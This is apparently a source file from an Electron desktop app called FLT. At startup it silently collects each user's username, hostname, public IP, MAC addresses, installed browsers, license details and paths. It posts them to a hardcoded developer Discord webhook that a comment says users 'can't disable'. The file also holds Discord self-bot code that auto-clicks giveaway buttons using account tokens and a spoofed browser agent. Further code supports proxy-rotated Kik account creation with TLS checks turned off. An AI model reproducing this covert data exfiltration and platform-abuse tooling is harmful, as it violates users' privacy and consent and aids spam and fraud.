async function gatherUserProfile() {
  const cpus = os.cpus() || [];
  const seenRec = _readFirstSeen();
  let pkg = {};
  try { pkg = require('./package.json'); } catch {}
  let licenseInfo = null;
  try { licenseInfo = license.getCachedInfo() || null; } catch {}
  let storedKey = '';
  try { storedKey = license.getStoredKey() || ''; } catch {}
  // Display info
  let primary = null, displays = [];
  try {
    const p = screen.getPrimaryDisplay();
    if (p) primary = {
      width: p.size.width, height: p.size.height,
      scale: p.scaleFactor, depth: p.colorDepth, rotation: p.rotation,
    };
    displays = (screen.getAllDisplays() || []).map(d => ({
      w: d.size.width, h: d.size.height, scale: d.scaleFactor,
    }));
  } catch (_) {}
  // GPU info (Electron async)
  let gpu = null;
  try {
    const gpuInfo = await app.getGPUInfo('basic');
    gpu = (gpuInfo && (gpuInfo.gpuDevice || gpuInfo)) || null;
  } catch (_) {}
  // Power
  let power = null;
  try {
    power = {
      on_battery: powerMonitor.isOnBatteryPower ? powerMonitor.isOnBatteryPower() : null,
    };
  } catch (_) {}

  return {
    summary: {
      windows_user:  os.userInfo().username,
      hostname:      os.hostname(),
      os:            `${os.type()} ${os.release()}`,
      cpu:           cpus[0] ? cpus[0].model : 'unknown',
      ram_gb:        Math.round(os.totalmem() / 1e9 * 10) / 10,
      app_version:   pkg.version || 'unknown',
    },
    identity: {
      windows_user:  os.userInfo().username,
      hostname:      os.hostname(),
      session_id:    (fltLog.getSessionInfo() || {}).session_id,
      machine_id:    (fltLog.getSessionInfo() || {}).machine_id,
      first_seen:    seenRec && seenRec.first_seen,
      last_seen:     seenRec && seenRec.last_seen,
      sessions_count:seenRec && seenRec.sessions_count,
      locale:        app.getLocale(),
      country_code:  (typeof app.getLocaleCountryCode === 'function') ? app.getLocaleCountryCode() : null,
      timezone:      (function(){ try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch { return null; } })(),
      public_ip:     (fltLog.getSessionInfo() || {}).ip,
    },
    license: {
      key_masked:    storedKey ? (storedKey.slice(0, 4) + '…' + storedKey.slice(-4)) : null,
      info:          licenseInfo,
    },
    system: {
      platform:      process.platform,
      arch:          process.arch,
      os_type:       os.type(),
      os_release:    os.release(),
      os_version:    (typeof os.version === 'function') ? os.version() : null,
      uptime_sec:    Math.round(os.uptime()),
      cpu_model:     cpus[0] ? cpus[0].model : null,
      cpu_speed_mhz: cpus[0] ? cpus[0].speed : null,
      cpu_cores:     cpus.length,
      ram_total_gb:  Math.round(os.totalmem() / 1e9 * 10) / 10,
      ram_free_gb:   Math.round(os.freemem() / 1e9 * 10) / 10,
      tmpdir:        os.tmpdir(),
      homedir:       os.homedir(),
      gpu:           gpu,
      primary_display: primary,
      displays_count:  displays.length,
      power,
    },
    browsers:        await _detectInstalledBrowsers(),
    network: {
      interfaces:    _networkInterfaces(),
      public_ip:     (fltLog.getSessionInfo() || {}).ip,
    },
    app: {
      version:       pkg.version || 'unknown',
      build_date:    pkg.build && pkg.build.extraMetadata && pkg.build.extraMetadata.buildDate || null,
      packaged:      app.isPackaged,
      install_path:  app.getAppPath(),
      exe_path:      process.execPath,
      user_data:     app.getPath('userData'),
      electron:      process.versions.electron,
      chrome:        process.versions.chrome,
      node:          process.versions.node,
      v8:            process.versions.v8,
    },
  };
}

// Convert the profile into the Discord embed array. We make multiple
// embeds, one per category, all in a single webhook POST.
function _profileToDiscordEmbeds(p, headlineEmoji) {
  const _line = (k, v) => `**${k}:** ${v == null || v === '' ? '—' : v}`;
  const _code = (v) => v == null || v === '' ? '`—`' : '`' + String(v).slice(0, 80) + '`';
  const NOW = new Date().toISOString();

  const identityFields = [
    { name: 'Windows User',  value: _code(p.identity.windows_user),  inline: true },
    { name: 'Hostname',      value: _code(p.identity.hostname),      inline: true },
    { name: 'Machine ID',    value: _code(p.identity.machine_id),    inline: true },
    { name: 'Session ID',    value: _code(p.identity.session_id),    inline: true },
    { name: 'Sessions Total',value: _code(p.identity.sessions_count),inline: true },
    { name: 'Public IP',     value: _code(p.identity.public_ip),     inline: true },
    { name: 'Locale',        value: _code(p.identity.locale),        inline: true },
    { name: 'Country',       value: _code(p.identity.country_code),  inline: true },
    { name: 'Timezone',      value: _code(p.identity.timezone),      inline: true },
    { name: 'First Seen',    value: _code(p.identity.first_seen),    inline: false },
    { name: 'Last Seen',     value: _code(p.identity.last_seen),     inline: false },
  ];

  // License embed
  const lic = p.license.info || {};
  const licenseFields = [
    { name: 'Key (masked)',  value: _code(p.license.key_masked),     inline: true },
    { name: 'Status',        value: _code(lic.status || lic.state),  inline: true },
    { name: 'Valid',         value: _code(lic.valid ? '✓' : '✗'),    inline: true },
    { name: 'Expiry',        value: _code(lic.expiry || lic.expires),inline: true },
    { name: 'Plan',          value: _code(lic.plan || lic.product),  inline: true },
    { name: 'Owner',         value: _code(lic.owner || lic.email),   inline: true },
  ];
  if (lic.id)        licenseFields.push({ name: 'License ID',     value: _code(lic.id),       inline: false });
  if (lic.machine)   licenseFields.push({ name: 'Machine binding',value: _code(lic.machine),  inline: false });
  if (lic.lastValidated) licenseFields.push({ name: 'Last Validated', value: _code(lic.lastValidated), inline: false });

  // System embed
  const sysFields = [
    { name: 'Platform',     value: _code(p.system.platform + '/' + p.system.arch), inline: true },
    { name: 'OS',           value: _code(p.system.os_type + ' ' + p.system.os_release), inline: true },
    { name: 'OS Version',   value: _code(p.system.os_version), inline: true },
    { name: 'CPU',          value: _code(p.system.cpu_model), inline: false },
    { name: 'CPU Cores',    value: _code(p.system.cpu_cores), inline: true },
    { name: 'CPU Speed',    value: _code(p.system.cpu_speed_mhz ? p.system.cpu_speed_mhz + ' MHz' : null), inline: true },
    { name: 'GPU',          value: _code(p.system.gpu && (p.system.gpu.vendor || p.system.gpu.deviceString || JSON.stringify(p.system.gpu).slice(0, 60))), inline: true },
    { name: 'RAM Total',    value: _code(p.system.ram_total_gb + ' GB'), inline: true },
    { name: 'RAM Free',     value: _code(p.system.ram_free_gb  + ' GB'), inline: true },
    { name: 'Uptime',       value: _code(Math.round(p.system.uptime_sec / 60) + ' min'), inline: true },
    { name: 'Displays',     value: _code(p.system.displays_count + (p.system.primary_display ? ' (primary ' + p.system.primary_display.width + '×' + p.system.primary_display.height + '@' + p.system.primary_display.scale + 'x)' : '')), inline: false },
    { name: 'Battery',      value: _code(p.system.power ? (p.system.power.on_battery ? 'on battery' : 'AC') : null), inline: true },
    { name: 'Home',         value: _code(p.system.homedir), inline: false },
  ];

  // Browsers embed
  const browserFields = (p.browsers && p.browsers.length)
    ? p.browsers.map(b => ({
        name:  b.name,
        value: '`' + (b.version || 'unknown') + '`\n`' + (b.path || '').slice(0, 90) + '`',
        inline: false,
      }))
    : [{ name: 'No browsers detected', value: '`(none found at standard paths)`', inline: false }];

  // Network embed
  const netFields = [];
  for (const ni of (p.network.interfaces || []).slice(0, 6)) {
    netFields.push({
      name:  ni.name,
      value: '`' + (ni.mac || '?') + '` · v4:`' + (ni.ipv4 || '—') + '` · v6:`' + (ni.ipv6 ? ni.ipv6.slice(0, 32) : '—') + '`',
      inline: false,
    });
  }
  netFields.push({ name: 'Public IP', value: _code(p.network.public_ip), inline: false });

  // App embed
  const appFields = [
    { name: 'FLT Version', value: _code(p.app.version), inline: true },
    { name: 'Build Date',  value: _code(p.app.build_date), inline: true },
    { name: 'Packaged',    value: _code(p.app.packaged ? 'yes' : 'no'), inline: true },
    { name: 'Electron',    value: _code(p.app.electron), inline: true },
    { name: 'Chromium',    value: _code(p.app.chrome),   inline: true },
    { name: 'Node',        value: _code(p.app.node),     inline: true },
    { name: 'Install',     value: _code(p.app.install_path), inline: false },
    { name: 'User Data',   value: _code(p.app.user_data),    inline: false },
  ];

  const colorMain = 0x3dffa0;
  const tag = (p.identity.windows_user || '?') + '@' + (p.identity.hostname || '?');

  return [
    { title: (headlineEmoji || '👤') + '  Identity — ' + tag, color: colorMain, fields: identityFields, timestamp: NOW },
    { title: '🔑  License',                                    color: 0x7ad7ff, fields: licenseFields },
    { title: '🖥  System / Hardware',                          color: 0xb084ff, fields: sysFields },
    { title: '🌐  Browsers Installed',                         color: 0xffd84d, fields: browserFields },
    { title: '📡  Network',                                    color: 0xff7a00, fields: netFields },
    { title: '📦  FLT App',                                    color: 0x9aa3b2, fields: appFields, footer: { text: 'FLT user profile · machine ' + (p.identity.machine_id || '?') } },
  ];
}

// Public entry-point. Gathers + sends. Safe to call multiple times.
async function sendUserProfile(headline) {
  try {
    const profile = await gatherUserProfile();
    const seen    = _readFirstSeen();
    const isNew   = seen && seen.sessions_count === 1;
    const emoji   = isNew ? '🆕' : '👤';
    const head    = headline || (isNew
      ? '🆕 **NEW USER joined** — first launch ever on this machine'
      : '👤 User session — #' + (seen ? seen.sessions_count : '?'));
    const embeds  = _profileToDiscordEmbeds(profile, emoji);
    fltLog.logProfile(profile, embeds, head);
  } catch (e) {
    console.warn('[FLT-LOG] profile send failed:', e.message);
  }
}

app.whenReady().then(async () => {
  if (!checkIntegrity()) {
    console.error('[Security] Integrity check failed. Exiting.');
    app.quit();
    return;
  }
  registerGlobalShortcutBlocks();

  // ── Initialize the activity logger ──────────────────────────────────────
  // Two parallel webhooks fire on every event:
  //  • adminWebhookUrl — hardcoded above in FLT_ADMIN_WEBHOOK (you, Virus,
  //    control this; goes to YOUR Discord channel; friends can't disable it).
  //  • userWebhookUrl  — optional, set by each user in Settings (additive).
  try {
    const pkg = require('./package.json');
    fltLog.init({
      userDataDir:     app.getPath('userData'),
      adminWebhookUrl: FLT_ADMIN_WEBHOOK,
      userWebhookUrl:  process.env.FLT_LOGGER_WEBHOOK || _readPersistedWebhook(),
      appVersion:      pkg.version || '0.0.0',
      licenseSuffix:   (function(){ try { return license.getStoredKey(); } catch { return null; } })(),
    });
    const seenInfo = _bumpFirstSeen();
    fltLog.log(fltLog.ACTIONS.APP_START, {
      electron:           process.versions.electron,
      node:               process.versions.node,
      chrome:             process.versions.chrome,
      admin_webhook_set:  !!FLT_ADMIN_WEBHOOK,
      sessions_count:     seenInfo.rec.sessions_count,
      first_seen:         seenInfo.rec.first_seen,
      is_first_ever:      seenInfo.isFirstEver,
    }, 'info', seenInfo.isFirstEver ? '🆕 NEW user — first launch ever' : 'FLT launched');

    // Send the full user-profile snapshot ~8s after launch — gives time for
    // the public-IP fetch (api.ipify.org) to land and the license cache to
    // populate from local storage. Captures EVERYTHING: identity, license,
    // system specs, all installed browsers + versions, network interfaces.
    setTimeout(() => {
      sendUserProfile(seenInfo.isFirstEver
        ? '🆕 **NEW USER joined FLT** — first launch ever'
        : null
      );
    }, 8000);

    // Clean up any orphaned flt-fbc-* / flt-kac-* temp dirs from prior
    // crashed runs — prevents the C: drive from filling over time.
    setTimeout(fbcSweepStaleTempDirs, 2000);
  } catch (e) {
    console.warn('[FLT-LOG] init failed:', e.message);
  }

  // Always open license gate — it will pre-fill the stored key and validate
  createLicenseWindow();
});

// Capture uncaught errors as critical log events — never lose a crash
process.on('uncaughtException', (err) => {
  try {
    fltLog.log(fltLog.ACTIONS.APP_CRASH, { error: String(err.stack || err.message || err) }, 'critical', 'Uncaught exception');
  } catch (_) {}
  console.error('[uncaughtException]', err);
});
process.on('unhandledRejection', (reason) => {
  try {
    fltLog.log(fltLog.ACTIONS.ERROR, { reason: String(reason) }, 'error', 'Unhandled rejection');
  } catch (_) {}
});

app.on('will-quit', () => {
  globalShortcut.unregisterAll();
  try {
    fltLog.log(fltLog.ACTIONS.APP_QUIT, {}, 'info', 'FLT quitting');
    fltLog.flush(3000);   // best-effort drain before exit
  } catch (_) {}
});

app.on('window-all-closed', () => {
  if ((!mainWin || mainWin.isDestroyed()) && (!licenseWin || licenseWin.isDestroyed())) {
    app.quit();
  }
});

/* ============================================================================
   DISCORD TOOLS - Interaction Tester IPC
   Append-only module. Single selected account, one request at a time.
============================================================================ */
let dctInteractionBusy = false;
const DCT_TIMEOUT_MIN_MS = 3000;
const DCT_TIMEOUT_MAX_MS = 30000;

function dctPickHeaders(headers) {
  const wanted = [
    'content-type',
    'date',
    'retry-after',
    'x-ratelimit-bucket',
    'x-ratelimit-limit',
    'x-ratelimit-remaining',
    'x-ratelimit-reset',
    'x-ratelimit-reset-after',
    'x-ratelimit-scope',
    'x-discord-request-id',
  ];
  const out = {};
  for (const k of wanted) {
    if (headers && headers[k] !== undefined) out[k] = headers[k];
  }
  return out;
}

function dctNormalizeTimeout(ms) {
  const n = Number(ms);
  if (!Number.isFinite(n)) return 15000;
  return Math.max(DCT_TIMEOUT_MIN_MS, Math.min(DCT_TIMEOUT_MAX_MS, Math.round(n)));
}

function dctTryJson(body) {
  if (!body) return null;
  try { return JSON.parse(body); } catch (_) { return null; }
}

function dctClassifyInteraction(status, body, headers, error) {
  const json = dctTryJson(body);
  const hay = [
    error,
    body,
    json && json.message,
    json && JSON.stringify(json.errors || {}),
  ].filter(Boolean).join(' ').toLowerCase();

  if (status === 204) return { category: 'success', summary: 'Interaction accepted with empty 204 response.' };
  if (status >= 200 && status < 300) return { category: 'success', summary: 'Interaction accepted.' };
  if (status === 401 || /invalid token|unauthorized|401: unauthorized|code"?\s*:\s*40001/.test(hay)) {
    return { category: 'invalid_token', summary: 'Discord rejected the account token.' };
  }
  if (status === 429 || headers['retry-after'] || headers['x-ratelimit-remaining'] === '0') {
    return { category: 'rate_limited', summary: 'Discord rate-limited this request.' };
  }
  if (/captcha|hcaptcha|recaptcha|sitekey|captcha_key|captcha_service/.test(hay)) {
    return { category: 'captcha', summary: 'Discord returned a captcha or verification challenge.' };
  }
  if (status === 403 || /locked|disabled|verify|verification|required|phone/.test(hay)) {
    return { category: 'locked_or_forbidden', summary: 'Account may be locked, restricted, or forbidden for this interaction.' };
  }
  if (error) return { category: 'network_error', summary: error };
  return { category: 'failed', summary: 'Discord returned a non-success response.' };
}

function dctPostInteraction(token, payload, opts) {
  return new Promise((resolve) => {
    const started = Date.now();
    const body = JSON.stringify(payload || {});
    const timeoutMs = dctNormalizeTimeout(opts && opts.timeoutMs);
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), timeoutMs);
    let settled = false;

    function finish(result) {
      if (settled) return;
      settled = true;
      clearTimeout(timeout);
      const headers = result.headers || {};
      const classification = dctClassifyInteraction(result.status || 0, result.body || '', headers, result.error || '');
      resolve(Object.assign({}, result, {
        ok: classification.category === 'success',
        classification,
        durationMs: result.durationMs == null ? Date.now() - started : result.durationMs,
        timestamp: result.timestamp || new Date().toISOString(),
      }));
    }

    const req = https.request('https://discord.com/api/v9/interactions', {
      method: 'POST',
      signal: controller.signal,
      headers: {
        'Authorization': String(token || '').trim(),
        'Accept': '*/*',
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body),
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/channels/@me',
        'User-Agent': CHROME_UA,
        'X-Discord-Locale': 'en-US',
      },
      timeout: timeoutMs,
    }, (res) => {
      let responseBody = '';
      res.setEncoding('utf8');
      res.on('data', chunk => { responseBody += chunk; });
      res.on('end', () => {
        finish({
          status: res.statusCode,
          body: responseBody,
          headers: dctPickHeaders(res.headers),
          durationMs: Date.now() - started,
          timestamp: new Date().toISOString(),
        });
      });
    });
    req.on('timeout', () => {
      controller.abort();
    });
    req.on('error', (err) => {
      const aborted = err && (err.name === 'AbortError' || err.code === 'ABORT_ERR');
      finish({
        status: 0,
        body: '',
        headers: {},
        durationMs: Date.now() - started,
        timestamp: new Date().toISOString(),
        error: aborted ? 'Request timed out after ' + timeoutMs + 'ms' : String(err && err.message || err),
      });
    });
    req.end(body);
  });
}

// ─── GET request helper for Discord API (mirrors dctPostInteraction style) ──
function dctGet(url, token, opts) {
  return new Promise((resolve) => {
    const timeoutMs = dctNormalizeTimeout(opts && opts.timeoutMs);
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), timeoutMs);
    let settled = false;
    function finish(result) {
      if (settled) return;
      settled = true;
      clearTimeout(timeout);
      resolve(result);
    }
    const req = https.request(url, {
      method: 'GET',
      signal: controller.signal,
      headers: {
        'Authorization': String(token || '').trim(),
        'Accept': '*/*',
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/channels/@me',
        'User-Agent': CHROME_UA,
        'X-Discord-Locale': 'en-US',
      },
      timeout: timeoutMs,
    }, (res) => {
      let body = '';
      res.setEncoding('utf8');
      res.on('data', c => { body += c; });
      res.on('end', () => finish({ status: res.statusCode, body, headers: dctPickHeaders(res.headers) }));
    });
    req.on('timeout', () => controller.abort());
    req.on('error', (err) => {
      const aborted = err && (err.name === 'AbortError' || err.code === 'ABORT_ERR');
      finish({ status: 0, body: '', headers: {}, error: aborted ? 'timeout' : String(err && err.message || err) });
    });
    req.end();
  });
}

// ─── Discord Giveaway auto-detect ────────────────────────────────────────────
// Given a Discord channel link/ID + a token, fetches the latest messages,
// finds one with components (buttons / select menus), and returns every field
// needed to auto-fill the DGA payload form. Saves the user from manually
// extracting IDs from DevTools.
ipcMain.handle('dc-tools-detect-giveaway', async (_e, request) => {
  const token = String(request && request.token || '').trim();
  if (!token) return { ok: false, error: 'No Discord token provided.' };

  let channelId = '';
  let guildId   = '';
  // Accept either a raw channel ID, or a Discord URL like
  //   https://discord.com/channels/<guildId>/<channelId>
  //   https://discord.com/channels/<guildId>/<channelId>/<messageId>
  const raw = String(request && request.channelInput || '').trim();
  if (!raw) return { ok: false, error: 'Paste a Discord channel link or ID.' };
  const m = raw.match(/discord(?:app)?\.com\/channels\/([^/]+)\/(\d+)(?:\/(\d+))?/i);
  if (m) {
    if (m[1] && m[1] !== '@me') guildId = m[1];
    channelId = m[2];
  } else if (/^\d{15,25}$/.test(raw)) {
    channelId = raw;
  } else {
    return { ok: false, error: 'Could not parse channel from input. Use a Discord URL or a 17-19 digit channel ID.' };
  }

  // Fetch recent messages (last 20 — covers giveaway bots that post related
  // sub-messages right after the main one)
  const limit = Math.max(1, Math.min(50, parseInt((request && request.limit) || 20, 10) || 20));
  const url = 'https://discord.com/api/v9/channels/' + encodeURIComponent(channelId) + '/messages?limit=' + limit;
  const res = await dctGet(url, token, { timeoutMs: 12000 });

  if (res.status === 401) return { ok: false, error: 'Token rejected (401). Token may be invalid or expired.', channel_id: channelId };
  if (res.status === 403) return { ok: false, error: 'Access denied (403). Account is not in this server or lacks permission to read.', channel_id: channelId };
  if (res.status === 404) return { ok: false, error: 'Channel not found (404). Check the channel ID.', channel_id: channelId };
  if (res.status === 429) return { ok: false, error: 'Rate-limited (429). Wait a few seconds and try again.', channel_id: channelId };
  if (!res.status || res.status >= 400) {
    return { ok: false, error: 'HTTP ' + (res.status || 0) + ' from Discord API' + (res.error ? ' — ' + res.error : ''), channel_id: channelId };
  }

  let messages;
  try { messages = JSON.parse(res.body); }
  catch (_) { return { ok: false, error: 'Could not parse Discord response.', channel_id: channelId }; }
  if (!Array.isArray(messages) || messages.length === 0) {
    return { ok: false, error: 'No messages in this channel (or you cannot read it).', channel_id: channelId };
  }

  // Newest-first scan for a message that has interactive components.
  // We look for buttons (component_type=2) first since that's the giveaway
  // case 95% of the time; fall back to select menus (3,5,6,7,8) otherwise.
  function scanComponents(comps, intoButtons, intoSelects) {
    if (!Array.isArray(comps)) return;
    for (const c of comps) {
      if (!c) continue;
      // Component type 1 = ActionRow (container) — recurse
      if (c.type === 1 && Array.isArray(c.components)) {
        scanComponents(c.components, intoButtons, intoSelects);
        continue;
      }
      // Component type 2 = Button. Must have custom_id (link buttons have url
      // and no custom_id — those are NOT clickable via interaction API).
      if (c.type === 2 && c.custom_id) {
        intoButtons.push({
          component_type: 2,
          custom_id:      c.custom_id,
          label:          c.label || '',
          emoji:          (c.emoji && (c.emoji.name || c.emoji.id)) || null,
          style:          c.style || null,
        });
        continue;
      }
      // Component types 3, 5, 6, 7, 8 = various selects
      if ([3, 5, 6, 7, 8].includes(c.type) && c.custom_id) {
        intoSelects.push({
          component_type: c.type,
          custom_id:      c.custom_id,
          label:          c.placeholder || '',
          option_count:   Array.isArray(c.options) ? c.options.length : null,
        });
      }
    }
  }

  let chosen = null;
  for (const msg of messages) {
    const buttons = [];
    const selects = [];
    scanComponents(msg.components, buttons, selects);
    if (buttons.length === 0 && selects.length === 0) continue;
    // Prefer the giveaway-like button — look for typical labels first
    const preferred = buttons.find((b) => {
      const t = (b.label || '').toLowerCase() + ' ' + (b.custom_id || '').toLowerCase();
      return /\b(enter|join|participate|claim|giveaway|raffle|drop)\b/.test(t);
    });
    const pickedComp = preferred || buttons[0] || selects[0];
    if (!pickedComp) continue;
    chosen = { msg, pickedComp, allButtons: buttons, allSelects: selects };
    break;
  }

  if (!chosen) {
    // Still helpful: return the first message's metadata + author so user can
    // see what we tried, in case the giveaway uses some non-button mechanism
    const first = messages[0];
    return {
      ok:           false,
      error:        'No clickable buttons or select menus on the last ' + messages.length + ' messages.',
      channel_id:   channelId,
      guild_id:     guildId,
      last_message: {
        id:      first?.id,
        author:  first?.author?.username || null,
        preview: (first?.content || '').slice(0, 120),
      },
    };
  }

  const m2 = chosen.msg;
  // application_id is the bot that owns the components — for a slash-command
  // bot it lives at message.application_id; for legacy interactions it's the
  // author's user ID (if author.bot === true).
  const applicationId =
    m2.application_id ||
    (m2.author && m2.author.bot ? m2.author.id : null) ||
    (m2.interaction_metadata && m2.interaction_metadata.application_id) ||
    null;

  return {
    ok:             true,
    channel_id:     channelId,
    guild_id:       guildId || (m2.guild_id || ''),
    message_id:     m2.id,
    application_id: applicationId,
    component_type: chosen.pickedComp.component_type,
    custom_id:      chosen.pickedComp.custom_id,
    button_label:   chosen.pickedComp.label,
    bot_name:       (m2.author && (m2.author.global_name || m2.author.username)) || null,
    bot_id:         (m2.author && m2.author.id) || null,
    message_preview:(m2.content || '').slice(0, 200),
    embed_title:    (Array.isArray(m2.embeds) && m2.embeds[0] && m2.embeds[0].title) || null,
    button_count:   chosen.allButtons.length,
    timestamp:      m2.timestamp || null,
    // Surface other buttons in case the giveaway has alternates (e.g.
    // multiple regions or tiers) — renderer can let user pick.
    other_buttons:  chosen.allButtons.filter(b => b.custom_id !== chosen.pickedComp.custom_id).slice(0, 5),
  };
});

ipcMain.handle('dc-tools-send-interaction', async (_e, request) => {
  if (dctInteractionBusy) {
    return {
      ok: false,
      status: 0,
      body: '',
      headers: {},
      timestamp: new Date().toISOString(),
      error: 'Another Discord interaction request is already in progress.',
    };
  }
  const token = String(request && request.token || '').trim();
  const payload = request && request.payload;
  const timeoutMs = dctNormalizeTimeout(request && request.timeoutMs);
  if (!token) {
    return { ok: false, status: 0, body: '', headers: {}, timestamp: new Date().toISOString(), error: 'Missing Discord account token.' };
  }
  if (!payload || typeof payload !== 'object' || Array.isArray(payload)) {
    return { ok: false, status: 0, body: '', headers: {}, timestamp: new Date().toISOString(), error: 'Interaction payload must be a JSON object.' };
  }
  dctInteractionBusy = true;
  try {
    return await dctPostInteraction(token, payload, { timeoutMs });
  } finally {
    dctInteractionBusy = false;
  }
});


/* ══════════════════════════════════════════════════════════════════════════
 *  KIK — Main-process network module
 *  All HTTP(S) requests for Kik account creation run here via Node.js
 *  native modules.  No BrowserWindow is ever opened for Kik registration.
 *  Proxy support: HTTP CONNECT tunnel (works for HTTPS targets).
 *  Proxy string format accepted: "host:port:user:pass" OR standard URL.
 * ══════════════════════════════════════════════════════════════════════════ */

// ── Parse proxy string → { host, port, user, pass } ─────────────────────────
function kikParseProxy(raw) {
  if (!raw) return null;
  const s = String(raw).trim();
  if (!s) return null;
  // URL form: http://user:pass@host:port  or  socks5://...
  if (/^https?:\/\//i.test(s) || /^socks/i.test(s)) {
    try {
      const u = new URL(s);
      return { host: u.hostname, port: parseInt(u.port) || 8080, user: decodeURIComponent(u.username || ''), pass: decodeURIComponent(u.password || '') };
    } catch (_) { return null; }
  }
  // Colon-separated: host:port:user:pass
  const parts = s.split(':');
  if (parts.length >= 4) {
    return { host: parts[0].trim(), port: parseInt(parts[1]) || 8080, user: parts[2].trim(), pass: parts.slice(3).join(':').trim() };
  }
  if (parts.length === 2) {
    return { host: parts[0].trim(), port: parseInt(parts[1]) || 8080, user: '', pass: '' };
  }
  return null;
}

// ── Proxy CONNECT tunnel → returns a connected TLS socket ───────────────────
function kikProxyConnect(proxy, targetHost, targetPort, timeoutMs) {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error('Proxy CONNECT timeout')), timeoutMs || 15000);
    const req = http.request({
      host:   proxy.host,
      port:   proxy.port,
      method: 'CONNECT',
      path:   targetHost + ':' + targetPort,
      headers: proxy.user
        ? { 'Proxy-Authorization': 'Basic ' + Buffer.from(proxy.user + ':' + proxy.pass).toString('base64') }
        : {},
      timeout: timeoutMs || 15000,
    });
    req.on('connect', (_res, socket) => {
      clearTimeout(timer);
      if (_res.statusCode !== 200) {
        socket.destroy();
        return reject(new Error('Proxy CONNECT returned HTTP ' + _res.statusCode));
      }
      resolve(socket);
    });
    req.on('error', (e) => { clearTimeout(timer); reject(e); });
    req.on('timeout', () => { req.destroy(new Error('Proxy CONNECT timeout')); });
    req.end();
  });
}

// ── Main fetch function — runs in main process, proxy-aware ─────────────────
function kikNetFetch(url, opts, proxy, timeoutMs) {
  return new Promise(async (resolve, reject) => {
    const ms = timeoutMs || 20000;
    let timer;
    try {
      const parsedUrl = new URL(url);
      const isHttps   = parsedUrl.protocol === 'https:';
      const host      = parsedUrl.hostname;
      const port      = parseInt(parsedUrl.port) || (isHttps ? 443 : 80);
      const method    = (opts && opts.method) || 'GET';
      const headers   = Object.assign({
        'User-Agent': 'com.kik.android/15.44.0 (Android 13; mobile)',
        'Accept':     'application/json',
        'Content-Type': 'application/json',
      }, (opts && opts.headers) || {});
      const body      = (opts && opts.body) ? String(opts.body) : null;
      if (body) headers['Content-Length'] = Buffer.byteLength(body);

      const reqOpts = {
        method,
        hostname: host,
        port,
        path: parsedUrl.pathname + parsedUrl.search,
        headers,
        timeout: ms,
      };

      const makeReq = (mod, extraOpts) => new Promise((res2, rej2) => {
        timer = setTimeout(() => rej2(new Error('Request timeout')), ms + 2000);
        const r = mod.request(Object.assign({}, reqOpts, extraOpts || {}), (response) => {
          let data = '';
          response.setEncoding('utf8');
          response.on('data', (c) => data += c);
          response.on('end', () => {
            clearTimeout(timer);
            res2({ status: response.statusCode || 0, headers: response.headers, body: data });
          });
        });
        r.on('error', (e) => { clearTimeout(timer); rej2(e); });
        r.on('timeout', () => { r.destroy(new Error('Socket timeout')); });
        if (body) r.write(body);
        r.end();
      });

      let result;
      if (proxy) {
        const pxy = typeof proxy === 'string' ? kikParseProxy(proxy) : proxy;
        if (!pxy) return reject(new Error('Invalid proxy string'));

        if (isHttps) {
          const tls = require('tls');
          const rawSock = await kikProxyConnect(pxy, host, port, ms);
          // Wait for TLS handshake before sending — avoids WRONG_VERSION_NUMBER
          const tlsSocket = await new Promise((ok, err) => {
            const s = tls.connect({ socket: rawSock, servername: host, rejectUnauthorized: false });
            s.once('secureConnect', () => ok(s));
            s.once('error', err);
          });
          // Use http.request with createConnection so we don't double-wrap TLS
          result = await new Promise((res2, rej2) => {
            timer = setTimeout(() => rej2(new Error('TLS timeout')), ms);
            tlsSocket.on('error', (e) => { clearTimeout(timer); rej2(e); });
            const r = http.request(Object.assign({}, reqOpts, {
              createConnection: () => tlsSocket,
              hostname: host,
            }), (response) => {
              let data = '';
              response.setEncoding('utf8');
              response.on('data', (c) => data += c);
              response.on('end', () => { clearTimeout(timer); res2({ status: response.statusCode || 0, headers: response.headers, body: data }); });
            });
            r.on('error', (e) => { clearTimeout(timer); rej2(e); });
            if (body) r.write(body);
            r.end();
          });
        } else {
          // HTTP through proxy — plain CONNECT or direct proxy request
          result = await makeReq(http, {
            hostname: pxy.host,
            port:     pxy.port,
            path:     url,
            headers:  Object.assign({}, headers, pxy.user
              ? { 'Proxy-Authorization': 'Basic ' + Buffer.from(pxy.user + ':' + pxy.pass).toString('base64') }
              : {}),
          });
        }
      } else {
        result = await makeReq(isHttps ? https : http);
      }

      resolve({ ok: result.status >= 200 && result.status < 300, status: result.status, headers: result.headers, body: result.body });
    } catch (e) {
      if (timer) clearTimeout(timer);
      reject(e);
    }
  });
}

// ── IPC: single fetch call ───────────────────────────────────────────────────
ipcMain.handle('kik-net-fetch', async (_e, { url, opts, proxy, timeoutMs }) => {
  try {
    const result = await kikNetFetch(url, opts || {}, proxy || null, timeoutMs || 20000);
    return { ok: result.ok, status: result.status, body: result.body, headers: result.headers };
  } catch (e) {
    return { ok: false, status: 0, body: '', error: String(e && e.message || e) };
  }
});

// ── IPC: check a list of proxies (concurrent, capped) ───────────────────────
ipcMain.handle('kik-proxy-check', async (_e, { proxies, timeoutMs }) => {
  const results = [];
  const CHECK_URL = 'https://httpbin.org/ip';
  const ms = timeoutMs || 10000;
  const CONCURRENCY = 5;

  const tasks = (proxies || []).map((raw) => async () => {
    const pxy = kikParseProxy(raw);
    if (!pxy) return { proxy: raw, ok: false, error: 'Invalid proxy format' };
    const start = Date.now();
    try {
      const r = await kikNetFetch(CHECK_URL, { method: 'GET' }, pxy, ms);
      const latency = Date.now() - start;
      if (r.ok || r.status === 200) {
        let ip = '';
        try { ip = JSON.parse(r.body).origin || ''; } catch (_) {}
        return { proxy: raw, ok: true, latency, ip };
      }
      return { proxy: raw, ok: false, error: 'HTTP ' + r.status, latency };
    } catch (e) {
      return { proxy: raw, ok: false, error: String(e && e.message || e), latency: Date.now() - start };
    }
  });

  // Run in batches of CONCURRENCY
  for (let i = 0; i < tasks.length; i += CONCURRENCY) {
    const batch = tasks.slice(i, i + CONCURRENCY).map(fn => fn());
    const done  = await Promise.all(batch);
    results.push(...done);
    if (mainWin && !mainWin.isDestroyed()) {
      mainWin.webContents.send('kik-proxy-progress', { done: results.length, total: tasks.length, latest: done });
    }
  }
  return { ok: true, results };
});

